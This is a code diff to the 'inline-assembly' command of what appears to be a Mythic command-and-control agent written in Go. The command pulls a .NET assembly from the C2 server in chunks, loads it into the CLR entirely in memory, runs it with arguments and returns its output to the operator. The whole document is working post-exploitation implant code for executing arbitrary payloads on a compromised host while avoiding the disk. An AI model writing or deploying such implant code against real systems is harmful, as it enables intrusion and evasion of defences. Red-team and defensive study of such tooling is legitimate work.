@@ -23,7 +23,6 @@
 package commands
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"runtime"
@@ -56,8 +55,8 @@ func (c *InlineAssemblyCommand) Description() string {
 
 // InlineAssemblyParams represents the parameters for inline-assembly
 type InlineAssemblyParams struct {
-	FileID    string   `json:"file_id"`
-	Arguments []string `json:"arguments"`
+	FileID    string `json:"file_id"`
+	Arguments string `json:"arguments"`
 }
 
 // Execute executes the inline-assembly command
@@ -107,87 +106,27 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		clrLoadedForExec = true
 	}
 
-	// Request the file from Mythic
-	// The file will be retrieved via the file transfer mechanism
-	// For now, we'll create a file transfer request
-	fileTransferChan := make(chan json.RawMessage, 1)
-	task.Job.FileTransfers[params.FileID] = fileTransferChan
-
-	// Request the file chunks
+	// Set up file transfer request to get assembly from Mythic
 	getFileMsg := structs.GetFileFromMythicStruct{
 		Task:                  &task,
 		FileID:                params.FileID,
-		FullPath:              "", // Not writing to disk
-		SendUserStatusUpdates: true,
+		FullPath:              "", // Not writing to disk - in-memory only
+		SendUserStatusUpdates: false,
 		ReceivedChunkChannel:  make(chan []byte, 100),
-		TrackingUUID:          params.FileID,
-		FileTransferResponse:  fileTransferChan,
 	}
 
+	// Send the file transfer request
 	task.Job.GetFileFromMythic <- getFileMsg
 
-	// Collect all chunks
+	// Collect all chunks into a byte slice
 	var assemblyBytes []byte
-	chunkNum := 0
-	totalChunks := -1
-
-	for {
-		select {
-		case chunk := <-getFileMsg.ReceivedChunkChannel:
-			if chunk == nil {
-				// Channel closed, we're done
-				goto EXECUTE
-			}
-			assemblyBytes = append(assemblyBytes, chunk...)
-			chunkNum++
-
-			// Send progress update
-			if totalChunks > 0 {
-				progress := fmt.Sprintf("[*] Received chunk %d/%d", chunkNum, totalChunks)
-				task.Job.SendResponses <- structs.Response{
-					TaskID:     task.ID,
-					UserOutput: progress,
-					Status:     "processing",
-					Completed:  false,
-				}
-			}
-
-		case rawResponse := <-fileTransferChan:
-			// Handle file transfer responses
-			var uploadResponse structs.FileUploadMessageResponse
-			err := json.Unmarshal(rawResponse, &uploadResponse)
-			if err != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error parsing file response: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
-			}
-
-			if totalChunks == -1 {
-				totalChunks = uploadResponse.TotalChunks
-			}
-
-			// Decode the chunk
-			decodedChunk, err := base64.StdEncoding.DecodeString(uploadResponse.ChunkData)
-			if err != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error decoding chunk: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
-			}
-
-			getFileMsg.ReceivedChunkChannel <- decodedChunk
-
-			// If this was the last chunk, close the channel
-			if uploadResponse.ChunkNum >= totalChunks-1 {
-				close(getFileMsg.ReceivedChunkChannel)
-			}
+	for chunk := range getFileMsg.ReceivedChunkChannel {
+		if chunk == nil || len(chunk) == 0 {
+			break
 		}
+		assemblyBytes = append(assemblyBytes, chunk...)
 	}
 
-EXECUTE:
 	if len(assemblyBytes) == 0 {
 		return structs.CommandResult{
 			Output:    "Error: No assembly data received from Mythic",
@@ -196,37 +135,59 @@ EXECUTE:
 		}
 	}
 
+	// Parse arguments string into array
+	var args []string
+	if params.Arguments != "" {
+		// Simple space-based splitting - doesn't handle quotes properly but good enough for most cases
+		args = strings.Fields(params.Arguments)
+	}
+
 	// Redirect STDOUT/STDERR to capture assembly output
 	err = clr.RedirectStdoutStderr()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Warning: Could not redirect output: %v\nProceeding with execution...", err),
-			Status:    "processing",
-			Completed: false,
+		// Non-fatal, just log it
+		task.Job.SendResponses <- structs.Response{
+			TaskID:     task.ID,
+			UserOutput: fmt.Sprintf("Warning: Could not redirect output: %v\nProceeding with execution...", err),
+			Status:     "processing",
+			Completed:  false,
 		}
 	}
 
-	// Execute the assembly
-	stdout, stderr := clr.ExecuteByteArrayDefaultDomain(runtimeHost, assemblyBytes, params.Arguments)
+	// Execute the assembly - wrapped in a recovery to catch panics
+	var stdout, stderr string
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				stderr = fmt.Sprintf("PANIC during assembly execution: %v", r)
+			}
+		}()
+		
+		stdout, stderr = clr.ExecuteByteArrayDefaultDomain(runtimeHost, assemblyBytes, args)
+	}()
 
 	// Build output
 	var output strings.Builder
 	output.WriteString(fmt.Sprintf("[+] Executed assembly (%d bytes)\n", len(assemblyBytes)))
 	
-	if len(params.Arguments) > 0 {
-		output.WriteString(fmt.Sprintf("[+] Arguments: %s\n\n", strings.Join(params.Arguments, " ")))
+	if len(args) > 0 {
+		output.WriteString(fmt.Sprintf("[+] Arguments: %s\n\n", params.Arguments))
 	}
 
 	if stdout != "" {
 		output.WriteString("=== STDOUT ===\n")
 		output.WriteString(stdout)
-		output.WriteString("\n")
+		if !strings.HasSuffix(stdout, "\n") {
+			output.WriteString("\n")
+		}
 	}
 
 	if stderr != "" {
 		output.WriteString("=== STDERR ===\n")
 		output.WriteString(stderr)
-		output.WriteString("\n")
+		if !strings.HasSuffix(stderr, "\n") {
+			output.WriteString("\n")
+		}
 	}
 
 	if stdout == "" && stderr == "" {
